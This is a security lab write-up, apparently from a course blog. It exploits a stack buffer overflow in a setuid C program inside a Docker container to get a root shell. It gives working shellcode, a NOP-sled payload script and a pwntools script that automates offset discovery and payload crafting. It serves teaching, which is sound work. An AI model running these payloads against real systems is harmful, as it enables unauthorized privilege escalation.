Continuing our [last lab](/crypto/2020/11/03/10-stack-branch.html)
we will use a buffer overflow to run an exploit which will
allow for [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

## Setup

***

Our setup here is that Mallory has found an executable with the *setuid* flag
enabled. Essentially this allows Mallory to run the executable with the
permissions of the owner of the file. The executable `/root/vuln` then
runs with root permissions even if Mallory is the one executing it.

Mallory wants to find a vulnerability which allows them to inject shellcode which
spawns an interactive shell.

The vulnerable program this time is

```c
#include <stdio.h>
#include <string.h>

void func(char *name)
{
    char buf[256];
    strcpy(buf, name);
    printf("Hello %s\n", buf);
}

int main(int argc, char *argv[])
{
    func(argv[1]);
    return 0;
}
```

recall in our case, ASLR and dmesg restrict are disabled

```
$ docker run --rm -v $(pwd):/shared --privileged -it thierrysans/vulnerable:stack-smashing-shellcode bash
# echo 0 > /proc/sys/kernel/randomize_va_space
# echo 0 > /proc/sys/kernel/dmesg_restrict
```

<br>

***

## Observations

***

We can compile the executable and disassemble it

```
/shared# gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack
/shared# objdump -d -M intel vuln > dump.dmp
```

the only new argument here is `-z execstack` which as you can guess,
makes the stack executable. Taking a look at `<func>` in the dump file,
we find

```
...
 804844a:    8d 85 f8 fe ff ff        lea    eax,[ebp-0x108]
...
```

so 264 bytes are reserved for the buffer. We expect the address
where the program jumps to to be stored in bytes 269-272 after the start
of the buffer. To test this, we send 268 `'a'` followed by `bcde` getting

```
/shared# ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijk
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijk
Segmentation fault (core dumped)
/shared# dmesg | grep "vuln" | tail -n 1
[17158.493232] vuln[4467]: segfault at 65646362 ip 0000000065646362 sp 00000000ffffd6b0 error 14
```

with the segfault occuring exactly where we expect. We also know from the log that
the stack pointer `sp` was at `0xffffd6b0` when the segfault happened, we can use this
to compute where the buffer begins in memory. Including our 4 added characters, the
length of our malicious payload was `268+4 = 272=0x110` bytes long. Subtracting this
from our `sp` we have that the buffer begins at `0xffffd6b0 - 0x110 = 0xffffd5a0`.

We will use room the buffer offers us to inject shellcode and point the jump
back into the buffer so that it executes the shellcode.
We are given the shellcode and the only remaining detail is deciding what
to set the address of our jump. Instead of relying on jumping exactly at the
beginning of our shellcode, we will add NOP padding before and after and attempt
to land somewhere in the middle to maximize our chances.

## The Exploit

***

We can write a script to send our payload through

```python
import sys

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
payload = b'\x90'*128 + shellcode + b'a'*115 + b'\xd0\xd5\xff\xff'
sys.stdout.buffer.write(payload)
```

and this would give us a shell however we can do better with a more abstract solution using pwntools

```python
from pwn import *
from shellcode import get_shellcode

pwnlib.term.term_mode= False
```

We can use the shellcraft module to generate the shellcode for an sh session

```python
def get_shellcode():
     return asm(shellcraft.i386.linux.sh())
```

the creation of the payload will be similar to our branching exercise except
instead of branching to another function, we will branch to somewhere within
our stack to execute the shellcode we produced.

```python
def craft_payload(path_to_vuln_prgm, shellcode):
    '''
    returns the payload for the attack
    given the path to the vulnerable binary
    and the shellcode from get_shellcode in shellcode.py
    (string, bytes) -> bytes
    '''
    de_brujin = cyclic(315)
    p = process([path_to_vuln_prgm, de_brujin])
    p.wait_for_close()
    debug_msg = process('dmesg | grep "vuln" | tail -n 1', stdout=subprocess.PIPE,
            shell=True).recvall()

    # save eip, esp from dmesg
    eip = int(re.search(b'ip\ (.*)\ sp', debug_msg).group(1), 16)
    esp = int(re.search(b'sp\ (.*)\ error', debug_msg).group(1), 16)
    #  esp = int(re.search(b'at\ (.*)\ sp', debug_msg).group(1), 16)
    overflow_len = cyclic_find(p32(eip))

    addr = esp - ((3/4)*overflow_len)
    NOPlen = int(3*(overflow_len - len(shellcode))/4)
    padlen = overflow_len - (NOPlen + len(shellcode))

    payload = b'\x90'*NOPlen + shellcode + b'a'*padlen + p32(int(addr))

    return payload
```

The goal of our computations will be for our memory to look something like this

```
      +--------+ <- start of buffer
      |  NOP   |
      |  SLED  |
 addr |        | <- want to jump somewhere in the middle
      |        |
      +--------+
      | SHELL  | <- our planted shellcode
      | CODE   |
      |        |
      |        |
      +--------+
      ~  ..... ~ <- additional pad
      +--------+
      |  addr  | <- return address
      |        |
      +--------+  
```

so we land somewhere in the NOP sled which slides us nicely into
our shellcode which executes sh. All that remains is making the
process interactive in python

```python
def run(path_to_vuln_prgm):
    shellcode = get_shellcode()
    payload = craft_payload(path_to_vuln_prgm, shellcode)
    p = process([path_to_vuln_prgm, payload])
    p.interactive()
```

## Cleanup

***

Finally, don't forget to check that the protections are enabled for your own
machine

```
$ echo 2 > /proc/sys/kernel/randomize_va_space
$ echo 1 > /proc/sys/kernel/dmesg_restrict
```

also don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
